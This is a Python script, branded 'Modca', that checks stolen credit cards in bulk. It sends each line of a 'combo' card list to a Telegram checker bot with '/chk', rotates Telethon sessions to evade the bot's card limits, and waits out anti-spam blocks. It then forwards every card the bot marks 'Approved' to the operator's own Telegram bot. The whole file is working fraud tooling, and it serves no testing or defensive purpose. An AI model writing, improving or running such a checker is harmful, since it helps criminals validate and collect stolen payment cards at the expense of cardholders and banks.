import os
import time
import random
import requests
import pyfiglet
import string
import telebot
import secrets
from telethon import TelegramClient, events, sync
from telethon.tl.functions.messages import GetHistoryRequest, GetBotCallbackAnswerRequest

X = '\033[1;33m'
logo = pyfiglet.figlet_format('                Modca')
print(X + logo)

ch = "@SDBB_Bot"
api_id = 'هنا ايبي هاش'
api_hash = 'هنا ايبي ايدي'

ID = "ايدي"
token = "توكنك"
combo = input('\033[1;32m ENTER YOU COMBO NAME :')

sessions = ['session3', 'session2', 'session3']
current_session = sessions[0]
client = TelegramClient(current_session, api_id, api_hash)
client.start()

def check_cc(cc, client, session_name):
    client.send_message(ch, f"/chk {cc}")
    time.sleep(random.randint(40, 60))
    mssag = client.get_messages(ch, limit=1)
    print(mssag[0].message)
    if "ANTI_SPAM" in str(mssag[0].message):
        t = str(mssag[0].message).split("again after ")[1]
        t = t.split("seconds")[0]
        t = int(t)
        print(f"Done Sleep : {t + 2}")
        time.sleep(t + 1)
    if 'Approved' in mssag[0].message:
        tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=NEW CC {mssag[0].message} 𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁🇩🇿⃤ ."
        i = requests.post(tlg)
    if "Only 20 cards" in mssag[0].message:
        print(f"Switching to the next session ({session_name})...")
        client.disconnect()
        return True
    if "Many" in mssag[0].message or "old" in mssag[0].message:
        print("You have been blocked, waiting for an hour and a minute")
        time.sleep(10000000)

while True:
    with open(combo, "r") as file:
        combo_lines = file.read().splitlines()
    
    for cc in combo_lines:
        try:
            if check_cc(cc, client, current_session):
                current_session = sessions[(sessions.index(current_session) + 1) % len(sessions)]
                client = TelegramClient(current_session, api_id, api_hash)
                client.start()
            time.sleep(1)
        except Exception as e:
            print(f"An error occurred: {e}")
